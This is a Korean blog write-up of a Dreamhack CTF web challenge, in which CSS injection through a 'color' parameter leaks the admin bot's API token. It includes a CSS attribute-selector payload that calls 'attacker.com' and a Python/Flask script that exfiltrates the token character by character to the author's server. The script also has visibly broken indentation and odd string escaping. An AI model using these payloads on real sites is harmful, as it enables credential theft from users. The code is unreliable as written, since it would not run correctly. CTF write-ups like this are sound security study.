---
title: CSS Injection
author: heogi
date: 2024-11-18
categories:
  - CTF
  - Dreamhack
  - Web
tags:
  - CSS
  - CSS-Injection
  - web
comments: true
---
# CSS Injection

## 1. Analysis
memo를 작성할 수 있는 서비스를 제공하는 페이지이다.
![](../assets/img/Pasted%20image%2020241118003515.png)
문제에서 제공하는 코드를 살펴보면 `/report` 를 통해 `admin` 이 사용자가 입력한 특정 URL에 접근하도록 할 수 있는 기능이있다.
또한 `/mypage` 에는 `token`  값이 존재하며 해당 값을 `API-KEY` header에 담아 보내면 `/api/memo` 를 통해 작성한 memo를 확인할 수 있다.

또한 `base.html` 의 코드 중 아래 `color` 파라미터를 통해 사용자의 값을 입력할 수 있으며, 이를 통해 CSS Injection을 트리거 할 수 있다.
```html
<style>
body{
	background-color: {{ color }};
}
</style>
```
![](../assets/img/Pasted%20image%2020241119003348.png)
## 2. Attack
공격을 위한 시나리오는 아래와 같다.
```text
1. color 파라미터를 통해 CSS Injection을 수행한다.
2. Admin의 API-Token 값을 탈취한다.
3. /api/memo를 호출하여 Flag를 확인한다.
```
먼저 color 파라미터를 통해 CSS Injection 공격을 진행, Admin의 API-Token을 탈취해야한다.
이를 위해 CSS Injection Technique 중 `Sequential Import Chaining` 사용한다.

### 2-1. Sequential Import Chaining
CSS의 `Attribute Selectors` 기능을 통해 특정 attribute를 가진 object의 value를 탈취하는 기법이다.
`Attribute Selectors` 는 특정 Attribute를 가진 Object의 CSS Style을 지정하는 기능이다.

input Object의 name이 password 이고 해당 Object의 value를 탈취하고 싶다면
아래처럼 `^=` 특성 선택자를 통하여 value 값에 접미사로 설정한 값이 포함되어있다면 Attacker의 URL로 요청을 보내도록 할 수 있다.
만약 value 가 `beast` 라면 `value^=b` 에서 요청을 보내게되며, 다시 `value^=be` 에서 요청을 보내게 된다.

```html
input[name=password][value^=a]{
    background: url('https://attacker.com/a');
}
input[name=password][value^=b]{
    background: url('https://attacker.com/b');
}
/* ... */
input[name=password][value^=9]{
    background: url('https://attacker.com/9');   
}
```

이를 코드로 구현하면 아래와 같다.

```python
import requests
from flask import Flask, request

app = Flask(__name__)

flag = ""
stop = False

def attack():
	global stop
	global flag
	
	url = "http://host3.dreamhack.games:14737/report"
	headers = {"session":"eyJ1aWQiOjIsInVzZXJuYW1lIjoidGVzdCJ9.Z0sWuQ.wJ757vrJQyofNeQ6TyhUOoRob_g"}

	print("Start Attack")
	
	for x in range(0,8):
		for i in range(ord('a'), ord('z') + 1):
			if stop == True:	
			stop = False	
			break
	
		prefix = flag + chr(i)
		print("sending..."+prefix)
		payload = "mypage?color=green; }} input[id=InputApitoken][value^=\{0\}] {{ background:url(http://ctf.heogi.com:5000/?c=\{0\})".format(prefix)
		data = {"path" : payload}
		requests.post(url, headers=headers, data=data)
	
	print("End Attack")

@app.route("/")
def index():
	global flag
	global stop
	
	if request.args.get('c'):
		c = request.args.get('c')
		flag = c
		print(flag)
		stop = True
	else:
		attack()
return flag

if __name__ == "__main__":
	app.run(host="0.0.0.0",debug=True,port=5000)
```
![](../assets/img/Pasted%20image%2020241130230050.png)
획득한 API-Token으로 /api/memo를 호출하면 FLAG를 획득할 수 있다.
![](../assets/img/Pasted%20image%2020241130230500.png)